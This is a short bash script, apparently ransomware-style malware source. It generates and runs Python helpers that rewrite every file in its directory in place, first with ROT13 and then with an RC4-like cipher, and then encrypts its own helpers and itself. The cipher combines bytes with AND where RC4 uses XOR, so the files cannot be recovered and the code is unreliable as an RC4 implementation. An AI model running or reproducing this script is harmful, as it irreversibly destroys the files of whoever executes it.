#!/usr/bin/env /bin/bash

/usr/bin/ls -l | /usr/bin/awk 'NR > 1 {print $9}' > zzzz.txt

/usr/bin/cat zzzz.txt | /usr/bin/grep -v 'file.sh' > file_names.txt

/usr/bin/cat << EOF > rot_encryptor.py

#!/usr/bin/env /usr/bin/python3

key = 'abcdefghijklmnopqrstuvwxyz'
def enc_rot(n, text):
	result = ''
	for l in text.lower():
		try:
			i = (key.index(l) + n) % 26
			result += key[i]
		except ValueError:
			result += l
	return result.lower()

EOF

for line in `/usr/bin/cat file_names.txt`;
do

/usr/bin/cat << EOF >> rot_encryptor.py

with open("$line", 'r') as fr:
	text = fr.read()

rot_text = enc_rot(13, text)

with open("$line", 'w') as fw:
	fw.write(rot_text)

EOF

done

/usr/bin/cat << EOF > arc_encryptor.py
#!/usr/bin/env /usr/bin/python3

import hashlib
import subprocess

def arc4(data, key):
	x = 0
	box = range(256)
	for i in range(256):
		x = (x + box[i] + ord(key[i % len(key)])) % 256
		box = list(box)
		box[i], box[x] = box[x], box[i]
	x = 0
	y = 0
	out = []
	for char in data:
		x = (x + 1) % 256
		y = (y + box[x]) % 256
		box[x], box[y] = box[y], box[x]
		out.append(chr(ord(char) & box[(box[x] + box[y]) % 256]))
	return ''.join(out)


EOF

for line in `/usr/bin/cat file_names.txt`;
do

/usr/bin/cat << EOF >> arc_encryptor.py

with open("$line", "r") as fr:
	plaintext = fr.read()
	key = hashlib.sha512(plaintext.encode()).hexdigest()
	print(key)
ciphertext = arc4(plaintext, key)

with open("$line", "w+") as fw:
	fw.write(ciphertext)

EOF

done


/usr/bin/cat << EOF >> arc_encryptor.py

with open("rot_encryptor.py", "r") as fr:
	plaintext = fr.read()
	key = hashlib.sha512(plaintext.encode()).hexdigest()
	print(key)
ciphertext = arc4(plaintext, key)

with open("rot_encryptor.py", "w") as fw:
	fw.write(ciphertext)

with open("file.sh", "r") as fr:
	plaintext = fr.read()
	key = hashlib.sha512(plaintext.encode()).hexdigest()
	print(key)
ciphertext = arc4(plaintext, key)

with open("file.sh", "w+") as fw:
	fw.write(ciphertext)

with open("arc_encryptor.py", "r") as fr:
	plaintext = fr.read()
	key = hashlib.sha512(plaintext.encode()).hexdigest()
	print(key)
ciphertext = arc4(plaintext, key)

with open("arc_encryptor.py", "w+") as fw:
	fw.write(ciphertext)

print(subprocess.Popen(['/usr/bin/rm','file_names.txt']))

EOF

/usr/bin/python3 rot_encryptor.py
/usr/bin/python3 arc_encryptor.py

